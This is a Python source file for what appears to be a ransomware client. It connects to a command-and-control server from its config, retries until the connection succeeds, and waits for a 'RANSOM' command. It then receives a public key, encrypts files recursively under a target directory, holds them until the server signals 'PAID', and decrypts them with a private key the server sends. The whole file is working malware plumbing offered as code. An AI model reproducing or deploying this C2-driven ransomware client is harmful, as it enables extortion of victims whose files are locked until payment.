from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import load_pem_private_key, load_pem_public_key

import socket
import time
import ransom
import config


class Client:
    def __init__(self, host, port):
        self.host = host # IP of server
        self.port = port # Port of server
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to server, if fails retry every RETRY_TIME seconds
    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            print(f"Connected to server at {self.host}:{self.port}")
        except:
            self.retry()

    # Main loop, waits for commands from server and executes
    def run(self):
        while True:
            try:
                data = self.socket.recv(2048)
                self.parse(data)
            except ConnectionResetError:
                self.retry()
                return
            except Exception as e:
                print(e)
    
    # Parses commands from server and executes corresponding attack
    def parse(self, data):
        match data.decode():
            case "RANSOM":
                self.ransomware()
        
    # If connection fails, wait RETRY_TIME seconds and try again with a fresh socket
    def retry(self):
        print("Couldn't connect, retrying in", config.RETRY_TIME)
        time.sleep(config.RETRY_TIME)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create new
        self.connect()


    ### ATTACKS ###
    # Ransomware attack, encrypts files and waits for payment before decrypting
    def ransomware(self): # pub_key is PEM encoded string possibly idk
        # Send ready for attack
        self.socket.send("READY".encode())

        # Attacker responds with public key
        pub_key_raw = self.socket.recv(4096) # Recieve public key PEM
        pub_key = load_pem_public_key(pub_key_raw) # Load public key from PEM

        encrypter = ransom.Encrypter(pub_key) # Create encrypter with pub key
        ransomware = ransom.Ransomware(config.TARGET_DIR, encrypter) # Create ransomware object with new encrypter and directory to start recursion from
        # Run Encrypt
        ransomware.encrypt_files()
        # Send Confirm
        self.socket.send("OK".encode())
        paid = False
        while not paid:
            data = self.socket.recv(2048)
            if data.decode() == "PAID":
                paid = True
                self.socket.send("OK".encode())
            else:
                self.socket.send("PONG".encode())

        # Wait For Private Key
        priv_key_raw = self.socket.recv(4096)
        priv_key = load_pem_private_key(priv_key_raw, password=None)
        # Run Decrypt
        ransomware.decrypt_files(config.TARGET_DIR, priv_key)

if __name__ == "__main__":
    c = Client(config.HOST, config.PORT)
    c.connect()
    c.run()